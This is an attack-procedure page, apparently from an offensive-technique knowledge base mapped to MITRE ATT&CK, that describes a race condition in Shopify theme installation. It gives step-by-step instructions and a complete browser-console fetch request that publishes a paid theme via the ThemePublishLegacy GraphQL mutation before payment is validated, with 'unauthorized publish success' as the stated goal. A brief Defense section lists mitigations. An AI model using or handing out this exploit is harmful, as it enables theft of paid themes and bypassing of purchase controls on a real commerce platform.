---
id: proc-shopify-extract-publish-id
tags:
  - shopify
  - race-condition
  - graphql-mutation
type: procedure
tools:
  - '[[tools/Google-Chrome-Developer-Tools]]'
tactics:
  - '[[Defense Evasion]]'
commands:
  - '[[commands/shopify-publish-theme-fetch]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:35.798Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-and-Publish-Temporary-Theme-ID

## Summary

This core procedure extracts the temporary theme ID from the installation GraphQL response and executes a modified publish mutation to set the paid theme as active before payment validation, bypassing access controls.

## Description

During installation, the ThemesProcessingLegacy GraphQL request returns the temporary ID in the response. This ID is inserted into the captured ThemePublishLegacy mutation, sent via fetch to the unversioned GraphQL endpoint. The race condition arises because publishing is allowed on the temporary ID before the installation enforces purchase requirements, granting full theme access.

## Requirements

1. Installation spinner active
2. Captured fetch code in console
3. Dev tools Network tab filtered for GraphQL

## Defense

Defensive measures and detection strategies:

- Validate theme ownership in publish mutation
- Implement locks on theme IDs during installation
- Alert on rapid publish during install

## Objectives

1. Locate and copy temporary theme ID
2. Modify and execute publish request
3. Achieve unauthorized publish success

## Instructions

### Step 1: Intercept GraphQL Response

**Context**: Capture the installation details.

In dev tools Network tab, filter for "ThemesProcessingLegacy" and select the first GraphQL POST request.

### Step 2: Extract Theme ID

**Context**: Parse the response for the ID.

View the response JSON, navigate to data > onlineStore > themes > edges > [0] > node > id, and copy the value (e.g., gid://shopify/OnlineStoreTheme/123456).

### Step 3: Execute Modified Fetch

**Context**: Publish using the temporary ID.

In console, paste the captured fetch code, replace [THEME_ID] with the extracted ID, and execute [[commands/shopify-publish-theme-fetch]]:

```javascript
fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", { "headers": { "accept": "application/json", "accept-language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "no-cache", "content-type": "application/json", "pragma": "no-cache", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "x-online-store-web": "1" }, "referrerPolicy": "no-referrer", "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[THEME_ID]\"},\"query\":\"mutation ThemePublishLegacy($id: ID!) {\n onlineStoreThemePublish(id: $id) {\n theme {\n id\n __typename\n }\n userErrors {\n field\n message\n __typename\n }\n __typename\n }\n}\
\"}", "method": "POST", "mode": "cors", "credentials": "include" });
```

> This sends the POST with the mutation; success shows theme ID in response without errors.

**Expected Output**: JSON with onlineStoreThemePublish success, no userErrors.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-publish-theme-fetch]]

## Tools Used

- [[tools/Google-Chrome-Developer-Tools]]

## Tags

- temporary-id
- publish-exploit
